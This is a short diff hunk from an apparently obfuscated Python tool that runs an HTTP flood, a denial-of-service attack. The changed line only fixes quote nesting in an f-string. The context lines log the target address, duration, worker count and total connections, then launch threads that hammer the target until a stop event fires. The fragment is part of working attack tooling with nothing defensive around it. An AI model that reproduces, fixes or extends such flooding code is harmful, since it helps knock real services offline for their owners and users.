@@ -134,7 +134,7 @@ def Aw(ip,port,secs,stop_event,threads=0):
 				try:A.close()
 				except:pass
 		except:pass
-	R=AW();O(f"[🌐] HTTP Flood iniciado");O(f"[+] Target: {"https"if U else"http"}://{ip}:{K}");O(f"[+] Duration: {H(M)}s");O(f"[+] Workers: {R}");O(f"[+] Connections per worker: 8");O(f"[+] Total connections: {R*8}");a=[]
+	R=AW();O(f"[🌐] HTTP Flood iniciado");O(f"[+] Target: {'https'if U else'http'}://{ip}:{K}");O(f"[+] Duration: {H(M)}s");O(f"[+] Workers: {R}");O(f"[+] Connections per worker: 8");O(f"[+] Total connections: {R*8}");a=[]
 	for k in G(R):J=N.Thread(target=j,args=(k,),daemon=E);J.start();a.append(J);C.sleep(.001)
 	C.sleep(M);P.set()
 	for J in a:
